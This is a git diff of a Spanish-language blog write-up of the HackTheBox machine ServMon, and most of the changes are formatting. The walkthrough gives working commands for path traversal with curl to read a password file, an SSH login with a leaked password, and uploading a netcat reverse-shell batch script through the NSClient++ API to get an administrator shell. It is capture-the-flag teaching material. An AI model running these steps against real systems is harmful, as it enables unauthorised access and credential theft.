@@ -1,8 +1,10 @@
 ---
 layout      : post
 title       : "HackTheBox - ServMon"
+author      : lanz
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/bannerservmon.png
 categories  : [ htb ]
+tags        : [ FTP, LFI, NSClient, API ]
 ---
 Máquina Windows nivel fácil. Iremos dando vueltas mediante FTP, exploraremos un Local File Inclusion. Jugaremos con la API del servicio NSClient para conseguir una shell como administrador.
 
@@ -21,17 +23,17 @@ Despues a traves del servicio `NSClient++` y del aplicativo `nsclient++.ini` enc
 
 ### Fases
 
-1. [Enumeración](#enumeración)
-2. [Explotación](#explotación)
+1. [Enumeración](#enumeracion)
+2. [Explotación](#explotacion)
 3. [Escalada de privilegios](#escalada-de-privilegios)
 
 ...
 
-## Enumeración {#enumeración}
+## Enumeración {#enumeracion}
 
 Demosle al escaneo de servicios con los que cuenta el host.
 
-```sh
+```bash
 $nmap -v -p- --open --min-rate=5000 -Pn -oG initScan 10.10.10.184
 ```
 
@@ -52,7 +54,7 @@ Usaremos una función de [S4vitar](https://www.youtube.com/channel/UCNHWpNqiM8yO
 
 ![outExtractPorts](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/outExtractPorts.png)
 
-```sh
+```bash
 $nmap -sV -sC -p21,22,80,135,139,445,5666,6063,6699,8443,49667,49669,49670 10.10.10.184 -oN portScan
 ```
 
@@ -100,13 +102,15 @@ Podemos inspeccionar, probar credenciales por default en los input, inyectar sen
 
 Encontramos un `.txt`, relacionando un **Directory Path Traversal**, lo que nos permite ver archivos del sistema en el que está corriendo la página, que normalmente no deberíamos ver.
 
-## Explotación {#explotación}
+...
+
+## Explotación {#explotacion}
 
 Podemos relacionar lo encontrado anteriormente con FTP, ya que sabiendo que **Windows** tiene normalmente en su raíz una carpeta llamada `c:\Users` y tenemos 2 usuarios, pero realmente uno es el que nos interesa, `Nathan` y que tiene en su escritorio el archivo `Password.txt`, entonces realizando la consulta quedaría así.
 
 Usaré cURL: 
 
-```sh
+```bash
 $curl --path-as-is -v http://10.10.10.184/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
 ```
 
@@ -119,7 +123,7 @@ $curl --path-as-is -v http://10.10.10.184/../../../../../../../../../../../../Us
 
 Perfecto, tenemos credenciales, veamos si alguna es de algún usuario.
 
-```sh
+```bash
 $ssh nadine@10.10.10.184
 
 password: L1k3B1gBut7s@W0rk
@@ -130,6 +134,8 @@ password: L1k3B1gBut7s@W0rk
 Listos, tenemos la flag del usuario. Veamos los últimos 18 caracteres.
 
 ![last18charsUsr](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/last18charsUsr.png)
+
+...
 
 ## Escalada de privilegios {#escalada-de-privilegios}
 
@@ -155,7 +161,7 @@ Siguiendo el POC realizaremos esto:
 4. Ejecutar el script con la ayuda la **API**.
 5. Conseguir la Shell como Administrador.
 
-### > Subir *nc.exe* (netcat) y el archivo *.bat* a Windows
+#### > Subir *nc.exe* (netcat) y el archivo *.bat* a Windows
 
 Descargar el ejecutable de netcat desde la web y crear él *.bat*
 
@@ -163,21 +169,21 @@ Usando `scp` podemos transferir mediante **SSH** archivos, siempre y cuando teng
 
 ![creatinganduploadBAT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/creatinganduploadBAT.png)
 
-### > Subir el archivo *.bat* al NSCLient++ como script con la API
+#### > Subir el archivo *.bat* al NSCLient++ como script con la API
 
 Buscar muy bien en la documentación, entender y hacer, llevo su tiempo, pero fue interesante.
 
-```sh
+```bash
 $curl -k -i -u admin https://localhost:8443/api/v1/scripts/ext?all=true
 ```
 
-Primero vemos los scripts actuales que maneja la app. (Además también para probar que todo va bien :P). Nos va a pedir la pw que ya encontramos en el **nsclient++.ini**
+Primero vemos los scripts actuales que maneja la app. (Además también para probar que todo va bien :P). Nos va a pedir la pw que ya encontramos en el **nsclient++.ini**.
 
 ![seeScriptsAPI](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/seeScriptsAPI.png)
 
 Listo, ahora lo que haremos será agregar el *queesesto.bat* como un script
 
-```sh
+```bash
 $curl -i -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts\c:\Temp\lana.bat --data-binary @lana.bat
 ```
 
@@ -187,7 +193,7 @@ Acá usamos **PUT** para "poner", indicándole donde está el archivo y donde qu
 
 Ahora, como hacemos para ejecutarlo, buscando y buscando, en la documentación hace referencia a `/queries`, en los cuales dentro de cada uno hay unos atributos y comandos, uno de ellos tiene una instrucción de **ejecución**. Veamos que *queries* hay.
 
-```sh
+```bash
 $curl -k -i -u admin https://localhost:8443/api/v1/queries/
 ```
 
@@ -203,21 +209,21 @@ Ya se ve el comando `execute` y hace referencia al script agregado.
 "execute_url":"https://localhost:8443/api/v1/queries/queesesto/commands/execute"
 ```
 
-### > Ponernos en escucha mediante **nc (netcat)**.
+#### > Ponernos en escucha mediante **nc (netcat)**.
 
 Finalmente, poniéndonos en escucha en nuestra máquina por el puerto **443**, que fue el que definimos en el *.bat* obtendremos la Shell.
 
-```sh
+```bash
 $nc -lnvp 443
 ```
 
-### > Ejecutar el script con la ayuda de la **API**.
+#### > Ejecutar el script con la ayuda de la **API**.
 
-```sh
+```bash
 $curl -k -i -u admin https://localhost:8443/api/v1/queries/queesesto/commands/execute
 ```
 
-### > Conseguir la Shell como Administrador.
+#### > Conseguir la Shell como Administrador.
 
 ![ncOKAdmin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/servmon/ncOKAdmin.png)
 
